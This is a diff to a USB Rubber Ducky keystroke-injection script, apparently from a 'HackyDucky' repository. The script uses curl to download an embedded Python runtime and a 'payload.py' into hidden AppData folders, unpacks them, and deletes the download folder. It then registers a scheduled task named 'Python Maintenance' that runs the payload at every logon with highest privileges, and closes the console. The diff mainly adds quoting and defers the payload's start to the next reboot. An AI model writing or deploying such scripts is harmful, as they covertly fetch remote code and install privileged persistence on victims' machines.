@@ -68,11 +68,11 @@ DEFAULT_DELAY 50
 
 REM Download python
 RUN()
-STRINGLN curl -q -s --create-dirs --output-dir %localappdata%\Temp\py\ -o tmp.zip https://raw.githubusercontent.com/x-9917638/HackyDucky/refs/heads/main/python-embedded.zip
+STRINGLN curl -o "tmp.zip" "https://raw.githubusercontent.com/x-9917638/HackyDucky/refs/heads/main/python-embedded.zip" -q -s --output-dir "%localappdata%\Temp\py\" --create-dirs
 
 REM Download main payload
 RUN()
-STRINGLN curl -q -s --output-dir %localappdata%\python1 -o python-manager.py https://raw.githubusercontent.com/x-9917638/HackyDucky/refs/heads/main/payload.py
+STRINGLN curl -q -s --output-dir "%localappdata%\python1" -o "python-manager.py" "https://raw.githubusercontent.com/x-9917638/HackyDucky/refs/heads/main/payload.py"
 DELAY 5000
 
 REM Unzip python
@@ -81,7 +81,7 @@ STRINGLN cmd /c "cd %localappdata% && mkdir python1 > nul & tar -xf Temp\py\tmp.
 
 REM remove python download dir to avoid pollution
 RUN()
-STRINGLN rmdir /s /q %localappdata%\Temp\py\
+STRINGLN rmdir /s /q "%localappdata%\Temp\py\"
 
 
 
@@ -97,8 +97,7 @@ ENTER
 REM Add task for startup run as admin
 STRINGLN schtasks /Create /TN "Python Maintenance" /TR "\"%localappdata%\python1\python.exe\" \"%localappdata%\python1\python-manager.py\"" /SC ONLOGON /RL HIGHEST /F
 
-REM Run main payload
-STRINGLN start /b %localappdata%\python1\python.exe %localappdata%\python1\python-manager.py
+REM Payload will start working on next reboot.
 
 REM Close cmd.exe
 ALT F4
